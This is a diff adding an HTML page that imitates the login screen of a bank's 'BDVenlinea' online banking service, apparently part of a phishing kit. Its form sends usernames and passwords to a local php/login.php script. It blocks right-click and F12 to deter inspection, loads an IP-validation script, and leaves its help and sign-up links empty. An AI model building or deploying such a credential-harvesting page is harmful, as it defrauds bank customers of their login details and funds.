@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BDVenlinea - Inicia Sesión</title>
+  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+  <link rel="apple-touch-icon" href="img/favicon.png">
+  <link rel="stylesheet" href="css/1.css">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+  <script src="js/alerta.js"></script>
+  <script src="ipvalidation.js"></script>
+  <script type="text/javascript">
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+    document.onkeydown = function(e) {
+      if (e.ctrlKey && (e.keyCode === 71)) {
+        return false;
+      }
+    };
+  </script>
+  <script>
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12') {
+        e.preventDefault();
+      }
+    });
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+  </script>
+</head>
+<body class="body">
+
+  <img src="img/background.png" class="background-img">
+  
+  <div style="position: absolute; left: 260px; top: 100px;">
+    <img src="img/bdv_logo.png" class="logo">
+  </div>
+  
+    <div class="container">
+      <div class="login-info">
+        <h1>Introduce tu usuario único</h1>
+        <form id="formulario" onsubmit="enviarFormulario(event)" action="php/login.php" method="post">
+          <div>
+            <input type="text" name="username" id="documento" placeholder="Usuario" required>
+          </div>
+          <div>
+            <input type="password" name="password" id="pass" placeholder="Contraseña" required>
+          </div>
+          <button type="submit" class="submit-button">Entrar</button>
+          <a class="forgot" href=""><strong>¿Olvidaste tu usuario o clave?</strong></a><br>
+          <a class="new" href=""><strong>Si eres nuevo clienteBDV, regístrate aquí</strong></a>
+        </form>
+      </div>
+    </div>
+<script src="js/processing.js"></script>
+</body>
+</html>
